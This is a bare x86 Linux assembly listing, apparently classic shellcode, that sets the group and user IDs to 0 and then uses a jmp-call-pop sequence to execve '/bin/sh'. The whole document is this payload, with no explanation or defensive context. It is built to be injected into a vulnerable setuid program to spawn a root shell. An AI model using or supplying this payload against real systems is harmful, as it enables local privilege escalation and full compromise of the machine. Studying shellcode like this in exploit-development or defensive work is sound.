.globl _start
_start:
	/* setgid(0) */
	xorl %ebx,%ebx
	movl %ebx,%eax
	movb $46,%al
	int $0x80
	/* setuid(0) */
	xorl %ebx,%ebx
	movl %ebx,%eax
	movb $23,%al
	int $0x80
	jmp getstring
rtn:
	pop %ebx
	xorl %edx,%edx
	movl %edx,%eax
	push %edx
	push %ebx
	movl %esp,%ecx
	movb $11, %al
	int $0x80
getstring: call rtn
	.string "/bin/sh\0"
